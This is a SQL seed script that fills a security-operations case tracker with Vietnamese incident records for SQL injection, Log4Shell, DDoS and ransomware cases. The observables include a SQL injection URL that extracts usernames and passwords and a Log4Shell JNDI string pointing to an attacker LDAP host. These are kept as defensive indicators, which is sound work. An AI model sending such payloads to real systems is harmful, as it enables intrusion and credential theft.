-- Reseed & Enrich SOC cases: Remove 3 English test cases and populate rich Vietnamese SOC data for 10 real cases.

-- 1. Remove 3 English test cases and their children strictly following foreign key constraints
DELETE FROM attachments WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM case_procedures WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM case_shares WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM case_logs WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM task_items WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM observables WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM alerts WHERE case_id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid) OR id IN ('20000000-0000-0000-0000-000000000001'::uuid, '20000000-0000-0000-0000-000000000002'::uuid, '20000000-0000-0000-0000-000000000003'::uuid);
DELETE FROM cases WHERE id IN ('10000000-0000-0000-0000-000000000001'::uuid, '10000000-0000-0000-0000-000000000002'::uuid, '10000000-0000-0000-0000-000000000003'::uuid);

-- 2. Enrich the remaining 10 real Vietnamese cases with observables, tasks, procedures, and logs

-- Case 43: SQL Injection
INSERT INTO observables (
    id, case_id, data_type, data, message, tlp, ioc, sighted, ignore_similarity,
    full_data, data_hash, organisation_ids, tags, created_by, created_at, updated_at
) VALUES (
    '30000000-0000-0000-0000-000000000431'::uuid, '10000000-0000-0000-0000-000000000043'::uuid,
    'ip', '114.114.114.114', 'IP nguồn thực hiện dò quét SQL Injection nhắm vào Customer Portal',
    2, true, true, false, '114.114.114.114', 'sha256:obs431', ARRAY['NCS SOC','Public Web'], ARRAY['attacker-ip', 'sqli'], 'web-sec@ncsgroup.vn', now() - interval '2 days', now() - interval '2 days'
), (
    '30000000-0000-0000-0000-000000000432'::uuid, '10000000-0000-0000-0000-000000000043'::uuid,
    'url', 'http://api.ncsgroup.vn/api/v1/customer/search?query=1%20UNION%20SELECT%20username,%20password%20FROM%20users--', 'Đường dẫn API bị nhắm mục tiêu khai thác SQL Injection',
    2, true, true, false, 'http://api.ncsgroup.vn/api/v1/customer/search?query=1%20UNION%20SELECT%20username,%20password%20FROM%20users--', 'sha256:obs432', ARRAY['NCS SOC','Public Web'], ARRAY['vulnerable-url'], 'web-sec@ncsgroup.vn', now() - interval '2 days', now() - interval '2 days'
) ON CONFLICT DO NOTHING;

INSERT INTO task_items (
    case_id, title, description, status, flag, assignee, group_name, order_index, start_date, due_date, organisation_ids, created_at, updated_at
) VALUES (
    '10000000-0000-0000-0000-000000000043'::uuid, 'Kiểm tra log truy vấn Database', 'Rà soát log của cơ sở dữ liệu PostgreSQL để kiểm tra xem có câu lệnh truy vấn union nào thực thi thành công không.', 'Completed', false, 'web-sec@ncsgroup.vn', 'Analysis', 1, now() - interval '2 days 2 hours', now() - interval '2 days', ARRAY['NCS SOC','Public Web'], now() - interval '3 days', now() - interval '2 days'
), (
    '10000000-0000-0000-0000-000000000043'::uuid, 'Rà soát cấu hình rules WAF Cloudflare', 'Kiểm tra cấu hình chặn SQLi của Cloudflare WAF xem có hoạt động chính xác đối với dải IP tấn công không.', 'Completed', false, 'web-sec@ncsgroup.vn', 'Analysis', 2, now() - interval '2 days', now() - interval '1 day 20 hours', ARRAY['NCS SOC','Public Web'], now() - interval '3 days', now() - interval '2 days'
), (
    '10000000-0000-0000-0000-000000000043'::uuid, 'Vá lỗ hổng bảo mật tại Endpoint API Search', 'Đội ngũ phát triển tiến hành vá lỗi bảo mật bằng cách tham số hóa (Parameterized Query) câu lệnh SQL tại API.', 'Completed', false, 'web-sec@ncsgroup.vn', 'Remediation', 3, now() - interval '1 day 20 hours', now() - interval '1 day 10 hours', ARRAY['NCS SOC','Public Web'], now() - interval '3 days', now() - interval '1 day 10 hours'
) ON CONFLICT DO NOTHING;

INSERT INTO case_logs (case_id, message, created_by, created_at) VALUES
('10000000-0000-0000-0000-000000000043'::uuid, '### Phát Hiện Sự Cố\nHệ thống Cloudflare WAF ghi nhận hơn 5000+ request mang payload SQLi từ dải IP VPN/Proxy độc hại. Toàn bộ request đã bị WAF block với mã lỗi 403.', 'system', now() - interval '3 days'),
('10000000-0000-0000-0000-000000000043'::uuid, '### Phân Tích & Vá Lỗi\nĐội ngũ phát triển Web-Security đã phân tích và xác nhận không có dữ liệu nào bị rò rỉ. Đã vá thành công endpoint `/api/v1/customer/search` bằng Parameterized queries. Sự cố chính thức được đóng.', 'web-sec@ncsgroup.vn', now() - interval '2 days')
ON CONFLICT DO NOTHING;


-- Case 47: Zero-day Log4j
INSERT INTO observables (
    id, case_id, data_type, data, message, tlp, ioc, sighted, ignore_similarity,
    full_data, data_hash, organisation_ids, tags, created_by, created_at, updated_at
) VALUES (
    '30000000-0000-0000-0000-000000000471'::uuid, '10000000-0000-0000-0000-000000000047'::uuid,
    'ip', '185.220.101.34', 'IP của attacker gửi payload jndi Log4j',
    2, true, true, false, '185.220.101.34', 'sha256:obs471', ARRAY['NCS SOC','CRM Team'], ARRAY['attacker-ip', 'log4j'], 'soc-l1@ncsgroup.vn', now() - interval '9 days', now() - interval '9 days'
), (
    '30000000-0000-0000-0000-000000000472'::uuid, '10000000-0000-0000-0000-000000000047'::uuid,
    'other', '${jndi:ldap://api.update-windows.xyz/a}', 'Chuỗi payload JNDI LDAP khai thác lỗi Log4Shell',
    2, true, true, false, '${jndi:ldap://api.update-windows.xyz/a}', 'sha256:obs472', ARRAY['NCS SOC','CRM Team'], ARRAY['payload', 'exploit'], 'soc-l1@ncsgroup.vn', now() - interval '9 days', now() - interval '9 days'
) ON CONFLICT DO NOTHING;

INSERT INTO task_items (
    case_id, title, description, status, flag, assignee, group_name, order_index, start_date, due_date, organisation_ids, created_at, updated_at
) VALUES (
    '10000000-0000-0000-0000-000000000047'::uuid, 'Kiểm tra phiên bản thư viện Log4j trên CRM', 'Xác định chính xác phiên bản Log4j đang chạy trong ứng dụng Java CRM. Đảm bảo phiên bản >= 2.17.1.', 'Completed', false, 'soc-l1@ncsgroup.vn', 'Analysis', 1, now() - interval '9 days 20 hours', now() - interval '9 days 18 hours', ARRAY['NCS SOC','CRM Team'], now() - interval '10 days', now() - interval '9 days 18 hours'
), (
    '10000000-0000-0000-0000-000000000047'::uuid, 'Áp dụng cờ JVM tắt tính năng lookup', 'Thực hiện restart ứng dụng Java với cờ `-Dlog4j2.formatMsgNoLookups=true` làm phương án giảm thiểu tạm thời.', 'Completed', false, 'soc-l1@ncsgroup.vn', 'Remediation', 2, now() - interval '9 days 18 hours', now() - interval '9 days 16 hours', ARRAY['NCS SOC','CRM Team'], now() - interval '10 days', now() - interval '9 days 16 hours'
), (
    '10000000-0000-0000-0000-000000000047'::uuid, 'Quét lỗ hổng toàn bộ máy chủ CRM', 'Chạy bộ quét Nessus/OpenVAS để rà soát toàn bộ các cổng mạng và dịch vụ Java CRM.', 'Completed', false, 'soc-l1@ncsgroup.vn', 'Analysis', 3, now() - interval '9 days 16 hours', now() - interval '9 days 10 hours', ARRAY['NCS SOC','CRM Team'], now() - interval '10 days', now() - interval '9 days 10 hours'
) ON CONFLICT DO NOTHING;

INSERT INTO case_logs (case_id, message, created_by, created_at) VALUES
('10000000-0000-0000-0000-000000000047'::uuid, '### Dò quét tự động phát hiện\nCảnh báo IPS ghi nhận chuỗi request chứa LDAP lookup gửi đến server CRM. Đã xác nhận hệ thống CRM đã được vá lỗi Log4Shell từ trước, request dò quét không thành công.', 'system', now() - interval '10 days'),
('10000000-0000-0000-0000-000000000047'::uuid, '### Đóng sự cố\nXác minh logs máy chủ không có hành vi tải class từ LDAP IP ngoài. Đã chạy rà soát quét an toàn thông tin toàn bộ cụm server CRM. Kết quả: An Toàn. Đóng case.', 'soc-l1@ncsgroup.vn', now() - interval '9 days')
ON CONFLICT DO NOTHING;


-- Case 48: DDoS Attack
INSERT INTO observables (
    id, case_id, data_type, data, message, tlp, ioc, sighted, ignore_similarity,
    full_data, data_hash, organisation_ids, tags, created_by, created_at, updated_at
) VALUES (
    '30000000-0000-0000-0000-000000000481'::uuid, '10000000-0000-0000-0000-000000000048'::uuid,
    'domain', 'api.ncsgroup.vn', 'Domain cổng API thanh toán bị nhắm mục tiêu DDoS',
    1, false, true, false, 'api.ncsgroup.vn', 'sha256:obs481', ARRAY['NCS SOC','Network Infrastructure'], ARRAY['ddos-target'], 'net-admin@ncsgroup.vn', now() - interval '19 days', now() - interval '19 days'
) ON CONFLICT DO NOTHING;

INSERT INTO task_items (
    case_id, title, description, status, flag, assignee, group_name, order_index, start_date, due_date, organisation_ids, created_at, updated_at
) VALUES (
    '10000000-0000-0000-0000-000000000048'::uuid, 'Kích hoạt chế độ Under Attack trên Cloudflare', 'Bật chế độ bảo vệ tối đa của Cloudflare để lọc botnet và yêu cầu thử thách JS Challenge đối với mọi traffic.', 'Completed', false, 'net-admin@ncsgroup.vn', 'Containment', 1, now() - interval '20 days', now() - interval '19 days 23 hours', ARRAY['NCS SOC','Network Infrastructure'], now() - interval '20 days', now() - interval '19 days 23 hours'
), (
    '10000000-0000-0000-0000-000000000048'::uuid, 'Phân tích phân phối đỉnh băng thông', 'Rà soát logs Cloudflare Analytics để xác định các quốc gia và dải ASNs đóng góp lưu lượng lớn nhất.', 'Completed', false, 'net-admin@ncsgroup.vn', 'Analysis', 2, now() - interval '19 days 23 hours', now() - interval '19 days 20 hours', ARRAY['NCS SOC','Network Infrastructure'], now() - interval '20 days', now() - interval '19 days 20 hours'
), (
    '10000000-0000-0000-0000-000000000048'::uuid, 'Kiểm tra sức khỏe hạ tầng Database Backend', 'Đánh giá tải lượng kết nối của DB Master/Slave trong thời gian bị DDoS để đảm bảo dữ liệu không bị nghẽn.', 'Completed', false, 'net-admin@ncsgroup.vn', 'Recovery', 3, now() - interval '19 days 20 hours', now() - interval '19 days 18 hours', ARRAY['NCS SOC','Network Infrastructure'], now() - interval '20 days', now() - interval '19 days 18 hours'
) ON CONFLICT DO NOTHING;

INSERT INTO case_logs (case_id, message, created_by, created_at) VALUES
('10000000-0000-0000-0000-000000000048'::uuid, '### Cảnh báo nghẽn băng thông\nBăng thông chạm ngưỡng 52.4 Gbps. Cổng API thanh toán không thể phản hồi request hợp lệ của khách hàng. Đã chuyển hướng traffic qua WAF Proxy để giảm thiểu.', 'system', now() - interval '20 days'),
('10000000-0000-0000-0000-000000000048'::uuid, '### Khôi phục hoạt động\nCloudflare Under Attack Mode lọc thành công 98% traffic rác. Dịch vụ khôi phục hoạt động bình thường sau 45 phút gián đoạn. Đóng case thành công.', 'net-admin@ncsgroup.vn', now() - interval '19 days')
ON CONFLICT DO NOTHING;


-- Additional Polish for Case 40 (Ransomware)
INSERT INTO case_logs (case_id, message, created_by, created_at) VALUES
('10000000-0000-0000-0000-000000000040'::uuid, '### Điều tra ban đầu\nPhát hiện tệp `xmrig.exe` và `miner.exe` được tải về thông qua tiến trình con của PowerShell. Ransomware bắt đầu mã hóa các tệp kế toán `.xlsx` và tạo tệp `.lockbit`. Tiến hành cô lập máy chủ.', 'soc-l2@ncsgroup.vn', now() - interval '2 hours')
ON CONFLICT DO NOTHING;
